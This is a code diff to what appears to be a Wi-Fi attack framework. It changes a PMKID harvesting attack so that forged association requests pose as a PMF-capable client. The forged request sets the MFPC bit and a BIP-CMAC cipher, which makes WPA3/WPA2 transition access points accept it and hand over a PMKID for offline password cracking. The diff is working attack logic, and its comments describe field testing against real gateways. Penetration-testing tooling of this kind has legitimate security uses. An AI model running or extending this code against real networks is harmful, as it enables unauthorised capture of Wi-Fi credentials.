@@ -78,22 +78,32 @@ _AKM_PSK = 0x02
 # principle but lack out-of-the-box tooling — add them here when that lands.
 _HARVESTABLE_AKMS = (_AKM_PSK,)
 
+# RSN Capabilities MFPC bit (bit 7) — "MFP Capable". Set (MFPR clear) when the
+# target is PMF-capable so a WPA3→WPA2 transition AP — which advertises MFPC=1 and
+# often only associates PMF-capable STAs — accepts our forged Assoc. (HW-observed:
+# an XFSETUP transition gateway ACKed our Auth but silently dropped an MFPC=0 Assoc.)
+_RSN_CAP_MFPC = 0x0080
+# Group Management Cipher advertised with MFPC: BIP-CMAC-128 (00-0F-AC:6), the WPA3
+# default; sent as a 4-byte suite after RSN caps + a zero PMKID count.
+_BIP_CMAC_128 = b"\x00\x0f\xac\x06"
 
-def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK) -> Optional[bytes]:
+
+def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK, *, pmf_capable: bool = False) -> Optional[bytes]:
     """Rewrite an RSN IE to a single ``00-0F-AC:akm`` AKM (PSK by default) over the
-    AP's version + group + pairwise ciphers, with *clean* RSN Capabilities (0x0000)
-    and nothing after them. Returns None if the IE is too short / malformed (caller
-    falls back to a generic PSK IE).
+    AP's version + group + pairwise ciphers, authoring a *correct client* RSN tail.
+    Returns None if the IE is too short / malformed (caller falls back to generic).
 
     An Assoc Req should *select* one AKM; echoing the AP's full list claims SAE on a
     WPA3-transition AP and gets us ignored. Forcing PSK runs the PSK 4-way → PMKID
-    in M1. We also DROP the AP's tail (its RSN Capabilities / PMKID list / group-mgmt
-    cipher) rather than echo it: a PMF-capable transition AP advertises MFPC=1 + a
-    BIP group-mgmt cipher there, an inconsistent profile for our unprotected PSK
-    client (we send the M-frames in the clear) that such an AP may mishandle — a
-    suspected cause of the transition-AP 'M1 not found'. Clean 0x0000 caps (no MFP)
-    match what we actually are. RSNE body layout: version(2) group(4) pw_count(2)
-    pw(4*n) akm_count(2) akm(4*m) [caps(2)] [pmkid...] [group-mgmt(4)]."""
+    in M1. The tail we author matches the AP's PMF posture (dropping its PMKID list):
+      - ``pmf_capable`` → present as a PMF-*capable* PSK client: MFPC=1 (MFPR=0),
+        PMKID-count 0, BIP group-mgmt cipher. A transition AP that only associates
+        PMF-capable STAs then accepts us. (M1 is pre-PTK EAPOL, still unprotected.)
+      - else → clean 0x0000 caps, no MFP tail.
+    Neither echoes the AP's raw tail (MFPR/PMKID list) — that inconsistent profile
+    was a suspected cause of the transition-AP 'M1 not found'. RSNE body layout:
+    version(2) group(4) pw_count(2) pw(4*n) akm_count(2) akm(4*m) [caps(2)]
+    [pmkid_count(2) pmkid...] [group-mgmt(4)]."""
     if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
         return None
     body = rsn_ie[2:2 + rsn_ie[1]]
@@ -108,7 +118,11 @@ def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK) -> Optional[bytes]:
     if akm_end > len(body):
         return None
     new_akm = b"\x01\x00\x00\x0f\xac" + bytes([akm])      # count=1 + 00-0F-AC:akm
-    new_body = body[:akm_off] + new_akm + b"\x00\x00"     # clean RSN caps (no MFP), drop the tail
+    if pmf_capable:                                       # MFPC=1, PMKID-count 0, BIP
+        tail = _RSN_CAP_MFPC.to_bytes(2, "little") + b"\x00\x00" + _BIP_CMAC_128
+    else:
+        tail = b"\x00\x00"                               # clean caps, no MFP
+    new_body = body[:akm_off] + new_akm + tail
     return bytes([0x30, len(new_body)]) + new_body
 
 
@@ -316,14 +330,18 @@ class PmkidHarvestAttack(Campaign):
             logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s) — can't harvest.",
                         self.target.bssid, self.target.akm_suites)
             return
+        # Feed the generic through _force_psk_akm too (it's a valid RSN IE) so the PMF
+        # posture applies even when we never captured the AP's own RSN IE.
+        base_rsn = self.target.rsn_ie or _GENERIC_RSN_IE
         self._assoc_rsn_ie = (
-            _force_psk_akm(self.target.rsn_ie, akm) if self.target.rsn_ie else None
-        ) or _GENERIC_RSN_IE
-        # What we actually advertise on the wire — AKM + the (now clean) RSN caps.
-        # Key diagnostic for the transition-AP 'M1 not found': confirms we send PSK
-        # with MFP off, so an M1 that still lands Protected is the AP's doing.
-        logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x): %s",
-                    akm, self._assoc_rsn_ie.hex())
+            _force_psk_akm(base_rsn, akm, pmf_capable=self.target.pmf_capable) or _GENERIC_RSN_IE
+        )
+        # What we actually advertise on the wire — AKM + the authored RSN caps.
+        # Key diagnostic for the transition-AP 'M1 not found': confirms the PMF
+        # posture we present (MFPC mirrors the AP), so an Assoc the AP still drops or
+        # an M1 that lands Protected is narrowed to the AP's own behaviour.
+        logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x, mfp_capable=%s): %s",
+                    akm, self.target.pmf_capable, self._assoc_rsn_ie.hex())
 
         # Make sure we're on the AP's channel — Focus already tunes here,
         # but be defensive.
